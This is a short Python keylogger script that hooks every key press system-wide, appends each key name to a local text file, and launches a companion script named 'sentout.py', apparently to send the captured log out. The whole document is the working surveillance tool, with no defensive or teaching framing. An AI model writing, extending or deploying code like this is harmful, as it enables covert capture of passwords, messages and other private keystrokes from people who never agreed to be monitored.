import os
import keyboard
import time
import subprocess

times = 60

def on_press(event):
    file_name = 'keyboard_inputs.txt'
    if not os.path.exists(file_name):
        open(file_name, 'w').close()
    with open(file_name, 'a') as file:
        file.write(event.name + ' ')

keyboard.on_press(on_press)
start_time = time.time()
subprocess.Popen(["python", "sentout.py"])
while True:
    keyboard.wait()
    if time.time() - start_time > times:
        start_time = time.time()
        time.sleep(3)
